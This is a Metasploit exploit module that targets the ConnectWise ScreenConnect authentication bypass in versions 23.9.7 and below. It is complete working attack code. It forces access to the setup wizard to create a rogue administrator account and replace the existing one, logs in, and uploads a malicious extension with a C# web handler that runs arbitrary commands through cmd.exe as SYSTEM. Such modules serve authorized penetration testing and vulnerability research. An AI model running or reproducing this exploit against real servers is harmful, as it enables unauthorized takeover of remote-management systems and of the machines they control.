##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ConnectWise ScreenConnect Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability that allows an unauthenticated attacker to create
          a new administrator user account on a vulnerable ConnectWise ScreenConnect server. The attacker can leverage
          this to achieve RCE by uploading a malicious extension module. All versions of ScreenConnect version 23.9.7
          and below are affected.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF RCE Exploit
          'WatchTowr', # Auth Bypass PoC
        ],
        'References' => [
          ['URL', 'https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8'], # Vendor Advisory
          ['URL', 'https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc/'] #  Auth Bypass PoC
        ],
        'DisclosureDate' => '2024-02-19',
        'Platform' => 'win',
        'Arch' => [ARCH_CMD],
        'Privileged' => true, # 'NT AUTHORITY\SYSTEM'
        'Targets' => [
          [
            'Default', {}
          ],
        ],
        'DefaultOptions' => {
          'RPORT' => 8040,
          'SSL' => false
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [
            IOC_IN_LOGS,
            CONFIG_CHANGES,
            # The existing administrator account will be replaced
            ACCOUNT_LOCKOUTS
          ]
        }
      )
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/')
    )

    return CheckCode::Unknown('Connection failed') unless res

    return CheckCode::Unknown("Received unexpected HTTP status code: #{res.code}.") unless res.code == 200

    if res.headers.key?('Server') && (res.headers['Server'] =~ %r{ScreenConnect/(\d+\.\d+.\d+)})

      detected = "ConnectWise ScreenConnect #{Regexp.last_match(1)}."

      if Rex::Version.new(Regexp.last_match(1)) <= Rex::Version.new('23.9.7')
        return CheckCode::Appears(detected)
      end

      return CheckCode::Safe(detected)
    end

    CheckCode::Unknown
  end

  def exploit
    #
    # 1. Begin the setup wizard using the vulnerability to access the SetupWizard.aspx page.
    #
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/SetupWizard.aspx/')
    )

    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from request 1.')
    end

    viewstate, viewstategen = get_viewstate(res)
    unless viewstate && viewstategen
      fail_with(Failure::UnexpectedReply, 'Did not locate the view state from request 1.')
    end

    #
    # 2. Advance to the next step in the setup.
    #
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/SetupWizard.aspx/'),
      'vars_post' => {
        '__EVENTTARGET' => '',
        '__EVENTARGUMENT' => '',
        '__VIEWSTATE' => viewstate,
        '__VIEWSTATEGENERATOR' => viewstategen,
        'ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton' => 'Next'
      }
    )

    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from request 2.')
    end

    viewstate, viewstategen = get_viewstate(res)
    unless viewstate && viewstategen
      fail_with(Failure::UnexpectedReply, 'Did not locate the view state from request 2.')
    end

    #
    # 3. Create a new administrator account.
    #
    admin_username = Rex::Text.rand_text_alpha_lower(8)
    admin_password = Rex::Text.rand_text_alphanumeric(16)

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/SetupWizard.aspx/'),
      'vars_post' => {
        '__EVENTTARGET' => '',
        '__EVENTARGUMENT' => '',
        '__VIEWSTATE' => viewstate,
        '__VIEWSTATEGENERATOR' => viewstategen,
        'ctl00$Main$wizard$userNameBox' => admin_username,
        'ctl00$Main$wizard$emailBox' => "#{admin_username}@#{Rex::Text.rand_text_alpha_lower(8)}.#{Rex::Text.rand_text_alpha_lower(3)}",
        'ctl00$Main$wizard$passwordBox' => admin_password,
        'ctl00$Main$wizard$verifyPasswordBox' => admin_password,
        'ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton' => 'Next'
      }
    )

    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from request 3.')
    end

    print_status("Created account: #{admin_username}:#{admin_password}. Note: This account will not be deleted by the module.")

    #
    # 4. Log in with this account to get an authenticated HTTP session.
    #
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/Administration'),
      'keep_cookies' => true,
      'authorization' => basic_auth(admin_username, admin_password)
    )

    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from request 4.')
    end

    unless res.body =~ %r{"antiForgeryToken"\s*:\s*"([a-zA-Z0-9+/=]+)"}
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from request 4.')
    end

    anti_forgery_token = Regexp.last_match(1)

    #
    # 5. Create an extension to host the payload.
    #

    # NOTE: Rex::Text.rand_guid return a GUID string wrapped in curly braces which is not what we want.
    plugin_guid = [8, 4, 4, 4, 12].map { |a| Rex::Text.rand_text_hex(a) }.join('-')

    payload_ashx = "#{Rex::Text.rand_text_alpha_lower(8)}.ashx"

    payload_handler_class = Rex::Text.rand_text_alpha(8)

    payload_psi_var = Rex::Text.rand_text_alpha(8)

    payload_data = %(<% @ WebHandler Language="C#" Class="#{payload_handler_class}" %>
using System;
using System.Web;
using System.Diagnostics;

public class #{payload_handler_class} : IHttpHandler
{
  public void ProcessRequest(HttpContext ctx)
  {
    ProcessStartInfo #{payload_psi_var} = new ProcessStartInfo();

    #{payload_psi_var}.FileName = "cmd.exe";

    #{payload_psi_var}.Arguments = "/c #{payload.encoded.gsub('\\', '\\\\\\\\')}";

    #{payload_psi_var}.RedirectStandardOutput = true;

    #{payload_psi_var}.UseShellExecute = false;

    Process.Start(#{payload_psi_var});
  }

  public bool IsReusable { get { return true; } }
})

    manifest_data = %(<?xml version="1.0" encoding="utf-8"?>
<ExtensionManifest>
  <Version>1</Version>
  <Name>#{Rex::Text.rand_text_alpha_lower(8)}</Name>
  <Author>#{Rex::Text.rand_text_alpha_lower(8)}</Author>
  <ShortDescription>#{Rex::Text.rand_text_alpha_lower(8)}</ShortDescription>
  <Components>
    <WebServiceReference SourceFile="#{payload_ashx}"/>
  </Components>
</ExtensionManifest>)

    zip_resources = Rex::Zip::Archive.new
    zip_resources.add_file("#{plugin_guid}/Manifest.xml", manifest_data)
    zip_resources.add_file("#{plugin_guid}/#{payload_ashx}", payload_data)

    #
    # 6. Upload the payload extension.
    #
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/Services/ExtensionService.ashx/InstallExtension'),
      'keep_cookies' => true,
      'ctype' => 'application/json',
      'data' => "[\"#{Base64.strict_encode64(zip_resources.pack)}\"]",
      'headers' => {
        'X-Anti-Forgery-Token' => anti_forgery_token
      }
    )

    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from request 5.')
    end

    print_status("Uploaded Extension: #{plugin_guid}")

    begin
      #
      # 7. Trigger the payload by requesting the extensions .ashx file.
      #
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'App_Extensions', plugin_guid, payload_ashx),
        'keep_cookies' => true
      )

      unless res&.code == 200
        print_status(res.code.to_s)
        print_status(res.body)
        fail_with(Failure::UnexpectedReply, 'Unexpected reply from request 6.')
      end
    ensure
      #
      # 8. Ensure we remove the extension when we are done.
      #
      print_status("Removing Extension: #{plugin_guid}")

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/Services/ExtensionService.ashx/UninstallExtension'),
        'keep_cookies' => true,
        'ctype' => 'application/json',
        'data' => "[\"#{plugin_guid}\"]",
        'headers' => {
          'X-Anti-Forgery-Token' => anti_forgery_token
        }
      )

      unless res&.code == 200
        print_warning('Failed to remove the extension.')
      end
    end
  end

  def get_viewstate(res)
    vs_input = res.get_html_document.at('input[name="__VIEWSTATE"]')
    unless vs_input&.key? 'value'
      print_error('Did not locate the __VIEWSTATE.')
      return nil
    end

    vsgen_input = res.get_html_document.at('input[name="__VIEWSTATEGENERATOR"]')
    unless vsgen_input&.key? 'value'
      print_error('Did not locate the __VIEWSTATEGENERATOR.')
      return nil
    end

    [vs_input['value'], vsgen_input['value']]
  end
end
